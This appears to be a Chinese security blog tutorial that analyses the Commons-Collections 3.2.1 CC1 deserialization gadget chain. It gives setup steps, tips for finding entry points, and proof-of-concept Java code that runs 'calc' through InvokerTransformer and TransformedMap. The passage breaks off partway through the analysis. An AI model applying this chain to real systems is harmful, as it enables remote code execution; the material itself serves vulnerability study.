    <content type="html"><![CDATA[<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>CC1 是 Apache Commons-Collections 3.2.1 库中最经典、最著名的反序列化利用链（Gadget Chain）。<br>攻击者只要能控制反序列化输入，就能通过 CC1 链在目标机器上执行任意命令（RCE）。</p><p>CC1 链的源头是 Commons Collections 库中的 Tranformer （ org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;Transformer.java ）接口中的 transform 方法。<br>这个接口的设计初衷，是为了把一个对象转换成另一个对象， 但是，<strong>在实现类里把 transform 变成“可以执行任意逻辑”时，就出现了漏洞。</strong></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li><p>官网下载jdk8u_65(以英文打开官网，才可下载到65；中文打开会下的其他版本)</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251119202801003.png" alt="image-20251119202800897"></p></li><li><p>建立项目，pom.xml加入3.2.1依赖</p><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;commons-collections&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;commons-collections&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;3.2.1&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure></li><li><p>修改sun包（<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4%EF%BC%89">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4）</a></p><p>class文件转为源码（方便调试）</p><ol><li><p>下载zip<img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805174.png" alt="image-20251119202800837"></p></li><li><p>解压得到jdk-af660750b2f4</p><p>在如图的路径</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251119210815556.png" alt="image-20251119210815486"></p></li><li><p>将sun文件夹放到（从上面拖到这个路径下）</p><p>sre从dk1.8.0_65的sre.zip解压即可</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251119211155618.png" alt="image-20251119211155555"></p></li><li><p>把 src 文件夹添加到源路径下</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251119214312683.png" alt="image-20251119214151066"></p></li></ol></li></ul><h1 id="Find-Usages（利用点查找）"><a href="#Find-Usages（利用点查找）" class="headerlink" title="Find Usages（利用点查找）"></a>Find Usages（利用点查找）</h1><h2 id="攻击链分析"><a href="#攻击链分析" class="headerlink" title="攻击链分析"></a>攻击链分析</h2><p>入口类这里，我们需要一个 <code>readObject</code> 方法，结尾这里需要一个能够命令执行的方法<code>（需要逆向分析）</code></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251120162207764.png" alt="image-20251120162200642"></p><p>commons collections就是可序列化集合类，可以接受任意对象</p><h2 id="利用点查找"><a href="#利用点查找" class="headerlink" title="利用点查找"></a><strong>利用点查找</strong></h2><ol><li><p>找到“反序列化入口”</p><p>找的是<strong>能触发</strong>：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">ObjectInputStream.readObject()</span></span></code></pre></div></div></figure><p>的地方（无论是手写的 &#x2F; 网络传输 &#x2F; RPC &#x2F; Tomcat session &#x2F; RMI 等）</p><p><strong>典型入口代码：</strong></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">ObjectInputStream ois = new ObjectInputStream(inputStream);</span></span><span class="line"><span style="color: #abb2bf">Object obj = ois.readObject();</span></span></code></pre></div></div></figure><p><code>IDE（如 IDEA）里直接用右键 readObject() → Find Usages</code>你就能看到所有执行反序列化的地方</p></li><li><p>从入口往下找“可控对象”</p><table><thead><tr><th>条件</th><th>描述</th></tr></thead><tbody><tr><td>✔ 有反序列化入口</td><td>readObject() 触发</td></tr><tr><td>✔ 输入内容可控</td><td>你可以发送恶意序列化数据</td></tr><tr><td>✔ 类的 <code>readObject</code> 中会调用某些危险点</td><td>如方法执行、getter 调用、hashCode 等</td></tr></tbody></table><p><strong>寻找会被反序列化的类</strong>：</p><ul><li>看 readObject() 之后出现的代码（调试时可见反序列化的类名）。</li><li>查看该入口接收的数据是什么类型的对象。</li><li>找这些类是否实现了 <code>Serializable</code>。</li></ul></li><li><p>找 <strong>危险方法自动触发点</strong></p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td><code>readObject()</code></td><td>反序列化时自动触发</td></tr><tr><td><code>readResolve()</code></td><td>替换对象时调用</td></tr><tr><td><code>finalize()</code></td><td>GC 时调用</td></tr><tr><td><code>hashCode()</code> &#x2F; <code>equals()</code></td><td>被放入 HashMap 时触发</td></tr><tr><td><code>compareTo()</code></td><td>TreeMap &#x2F; PriorityQueue 排序时触发</td></tr><tr><td><code>toString()</code></td><td>打日志时触发</td></tr></tbody></table></li><li><p>寻找  <strong>集合类引发的链式调用</strong></p><p> 用 Find Usages 查某个可疑类是否被放入 <strong>HashMap &#x2F; TreeMap &#x2F; PriorityQueue</strong> 等结构中。<br> 如果发现这种情况 &#x3D; 有可能形成反序列化链。</p></li><li><p>查 gadget（利用类）是否存在于依赖中</p><p>查看库中是否存在 gadget，例如：</p><ul><li>commons-collections</li><li>fastjson</li><li>jackson</li><li>xstream</li><li>groovy</li><li>jython</li><li>rome</li><li>spring-core</li></ul><p><strong>查看是否有地方反序列化这些类，就能判断是否可利用。</strong></p></li></ol><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><ul><li><p>先在一个CC1Test文件写个测试代码的框架吧</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">org.example</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.*</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">CC1Test</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">( </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF"> )</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Exception</span></span><span class="line"><span style="color: #61AFEF">    </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//在这测试</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> serialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">obj</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectOutputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">oos</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">oos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">writeObject</span><span style="color: #ABB2BF">(obj);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Object</span><span style="color: #61AFEF"> unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">Filename</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectInputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ois</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectInputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileInputStream</span><span style="color: #ABB2BF">(Filename));</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">obj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ois</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readObject</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> obj;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li></ul><h2 id="TransformedMap-版"><a href="#TransformedMap-版" class="headerlink" title="TransformedMap 版"></a>TransformedMap 版</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul><li><p>提前了解到cc1是由类InvokerTransformer它实现接口Transformer</p><p>可以先弹一个计算器测试一下，环境能不能跑通</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251120174146369.png" alt="image-20251120174146224"></p></li><li><p>首先是发现了了一个Transformer接口，用于接收对象来实现transform(Object input)方法</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251120174619905.png" alt="image-20251120174619857"></p></li><li><p>查看其实现类</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251120174737483.png" alt="image-20251120174737422"></p><p>定位到了InvokerTransformer</p></li><li><p>InvokerTransformer.java，查看这个文件的transform方法</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251120175042957.png" alt="image-20251120175042901"></p></li><li><p>发现存在反射调用</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">transform</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> input) {</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (input </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">           </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">       }</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75"> cls </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">input</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">Method</span><span style="color: #E06C75"> method </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">cls</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getMethod</span><span style="color: #ABB2BF">(iMethodName, iParamTypes);</span></span><span class="line"><span style="color: #E06C75">           </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">method</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">invoke</span><span style="color: #ABB2BF">(input, iArgs);</span></span></code></pre></div></div></figure><p>接收对象之后，对<strong>方法，值</strong>进行反射调用<code>（这些都是可以自主控制的）</code></p></li><li><p>利用</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">org.example</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.commons.collections.functors.InvokerTransformer</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.IOException</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">CC1Test</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">r</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//方法名为exec，参数类型为String，参数值为calc</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">InvokerTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">invokerTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;exec&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #ABB2BF">});</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">invokerTransformer</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">transform</span><span style="color: #ABB2BF">(r);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251120182139347.png" alt="image-20251120182139244"></p></li></ul><h3 id="逐步分析"><a href="#逐步分析" class="headerlink" title="逐步分析"></a>逐步分析</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><ul><li><p>InvokerTransformer.java存在exec()</p><p>也就是InvokerTransformer的transform方法是<strong>危险方法</strong></p><p><code>input 对象  →  InvokerTransformer(&quot;getMethod&quot;)           →  InvokerTransformer(&quot;invoke&quot;)           →  InvokerTransformer(&quot;exec&quot;)</code><br><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251120210855530.png" alt="image-20251120210855494"></p></li><li><p>现在要回推    <strong>哪个调用了transform</strong></p><p>跟进transform</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251120211501789.png" alt="image-20251120211501756"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251120211507188.png" alt="image-20251120211507149"></p><p>在项目和库中进行查找</p></li><li><p>主要是查看不同类 调用transform，最后最后回到readObject（）</p><p>也就是说不要transform返回transform</p><p>最后找到了就是<strong>map类</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251120211944627.png" alt="image-20251120211944587"></p><p>流程：就是看x调用transform，在找x有没有readObject()调用</p></li><li><p>TransformMap调用较多，先从这里入手</p><p>以checkSetValue为例：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">protected</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">checkSetValue</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> value) {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">valueTransformer</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">transform</span><span style="color: #ABB2BF">(value);</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>这个方法里面调用了transform</p></li><li><p>查看TransformedMap构造函数</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">protected</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">TransformedMap</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Map</span><span style="color: #E06C75"> map</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Transformer</span><span style="color: #E06C75"> keyTransformer</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Transformer</span><span style="color: #E06C75"> valueTransformer) {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">super</span><span style="color: #E06C75">(map)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">keyTransformer</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> keyTransformer</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">valueTransformer</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> valueTransformer</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>是个protected类，  自己才可调用</p><p>意思就是说：传入将key&amp;vbalue传入map，包装成TransformedMap</p><ol><li><p>super(map)</p><p>把传入的 <code>map</code> 保存到父类 <code>AbstractMapDecorator</code> 中<br> <strong>也就是它内部真正的数据还是你传进来的 Map。</strong></p><p>包了一层 ≈ 装饰模式（Decorator Pattern）</p></li><li><p>保存 key 和 value 的 transformer</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">keyTransformer</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> keyTransformer</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">valueTransformer</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> valueTransformer</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure><p>以后只要有人调用：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">map</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(key, value)</span></span></code></pre></div></div></figure><p>就会自动触发：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">key </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">keyTransformer</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">transform</span><span style="color: #ABB2BF">(key);</span></span><span class="line"><span style="color: #E06C75">value </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">valueTransformer</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">transform</span><span style="color: #ABB2BF">(value);</span></span></code></pre></div></div></figure></li></ol></li><li><p>在往上看decorate返回值为TransformedMap</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Map</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">decorate</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Map</span><span style="color: #E06C75"> map</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Transformer</span><span style="color: #E06C75"> keyTransformer</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Transformer</span><span style="color: #E06C75"> valueTransformer) {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">TransformedMap</span><span style="color: #E06C75">(map</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> keyTransformer</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> valueTransformer)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>decorate是个静态方法</p><p>存在就是为了：将一个普通的 Map，包装成一个“可自动 transform 的 Map</p><p><strong>疑问：</strong></p><p>TransformedMap写构造器。之后，为什么还要decorate静态方法</p><p>由于是protect的构造器，如果不能new，只能在内部调用，所以需要一个静态方法将其实例化</p><p><strong>所以就出现这样的构造：</strong></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">InvokerTransformer</span><span style="color: #E06C75"> invokerTransformer </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;exec&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #E06C75">}</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[]{</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #E06C75">})</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E5C07B">HashMap</span><span style="color: #E06C75"> map </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">HashMap</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">map</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;key&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;value&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> transformedMap </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">TransformedMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(map, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">, invokerTransformer);</span><span style="color: #7F848E; font-style: italic">//包装，调用即执行value = invokerTransformer.transform(value);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//(map, null, invokerTransformer)由于 checkSetValue返回的是valueTransformer，所以key为null</span></span></code></pre></div></div></figure></li></ul><h4 id="第二步"><a href="#第二步" class="headerlink" 